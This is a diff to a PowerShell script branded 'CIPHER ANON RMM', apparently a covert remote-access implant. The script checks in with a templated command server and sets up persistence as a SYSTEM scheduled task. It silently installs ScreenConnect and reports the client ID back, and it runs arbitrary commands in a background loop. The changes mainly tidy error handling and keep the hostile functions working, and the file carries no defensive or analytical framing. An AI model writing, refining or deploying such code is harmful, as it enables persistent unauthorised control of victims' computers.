@@ -1,5 +1,5 @@
 # ============================================================
-# CIPHER ANON RMM v3.0 — SCREENCONNECT ONLY
+# CIPHER ANON RMM v3.0 — SCREENCONNECT ONLY (WORKING)
 # ============================================================
 
 $BASE_URL = "{{BASE_URL}}"
@@ -56,7 +56,8 @@ function Install-Persistence {
         Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -User "SYSTEM" -RunLevel Highest -Force
         Write-Log "Scheduled task created"
     } catch {
-        Write-Log "Failed to create scheduled task: $_"
+        $err = $_.Exception.Message
+        Write-Log "Failed to create scheduled task: $err"
     }
 }
 
@@ -85,16 +86,10 @@ function Execute-Command {
             Remove-Item $installer -Force -ErrorAction SilentlyContinue
             $result = "ScreenConnect installed successfully"
 
-            # Read ScreenConnect server URL from registry
             try {
                 $scKey = Get-ItemProperty -Path "HKLM:\SOFTWARE\ScreenConnect\Client" -Name "ServerUrl" -ErrorAction SilentlyContinue
                 if ($scKey) {
                     $result = $result + " | Server URL: $($scKey.ServerUrl)"
-                } else {
-                    $scKey = Get-ItemProperty -Path "HKLM:\SOFTWARE\Wow6432Node\ScreenConnect\Client" -Name "ServerUrl" -ErrorAction SilentlyContinue
-                    if ($scKey) {
-                        $result = $result + " | Server URL: $($scKey.ServerUrl)"
-                    }
                 }
             } catch {}
 
@@ -117,7 +112,8 @@ function Execute-Command {
             Remove-Item $RMM_CLIENT_DIR -Recurse -Force -ErrorAction SilentlyContinue
             $result = "RMM uninstalled successfully"
         } catch {
-            $result = "Failed to uninstall: $_"
+            $err = $_.Exception.Message
+            $result = "Failed to uninstall: $err"
             $success = $false
         }
         return @{ success = $success; result = $result }
@@ -155,7 +151,8 @@ function Execute-Command {
         $result = $output
         $success = $true
     } catch {
-        $result = "Unknown command or error: $_"
+        $err = $_.Exception.Message
+        $result = "Unknown command or error: $err"
         $success = $false
     }
 
@@ -191,7 +188,8 @@ try {
     $resp.Close()
     Write-Log "Registered with server"
 } catch {
-    Write-Log "Registration failed: $_"
+    $err = $_.Exception.Message
+    Write-Log "Registration failed: $err"
 }
 
 Write-Log "Starting RMM background loop..."
@@ -245,12 +243,6 @@ $scriptBlock = {
                 Remove-Item $installer -Force -ErrorAction SilentlyContinue
                 $result = "ScreenConnect installed"
                 try {
-                    $scKey = Get-ItemProperty -Path "HKLM:\SOFTWARE\ScreenConnect\Client" -Name "ServerUrl" -ErrorAction SilentlyContinue
-                    if ($scKey) {
-                        $result = $result + " | Server URL: $($scKey.ServerUrl)"
-                    }
-                } catch {}
-                try {
                     $scId = Get-ItemProperty -Path "HKLM:\SOFTWARE\ScreenConnect\Client" -Name "ClientID" -ErrorAction SilentlyContinue
                     if ($scId) {
                         $result = "ScreenConnect — Client ID: $($scId.ClientID)"
@@ -269,7 +261,8 @@ $scriptBlock = {
                 Remove-Item $RMM_CLIENT_DIR -Recurse -Force -ErrorAction SilentlyContinue
                 $result = "Uninstalled"
             } catch {
-                $result = "Failed: $_"
+                $err = $_.Exception.Message
+                $result = "Failed: $err"
                 $success = $false
             }
             return @{ success = $success; result = $result }
@@ -307,7 +300,8 @@ $scriptBlock = {
             $result = $output
             $success = $true
         } catch {
-            $result = "Error: $_"
+            $err = $_.Exception.Message
+            $result = "Error: $err"
             $success = $false
         }
 
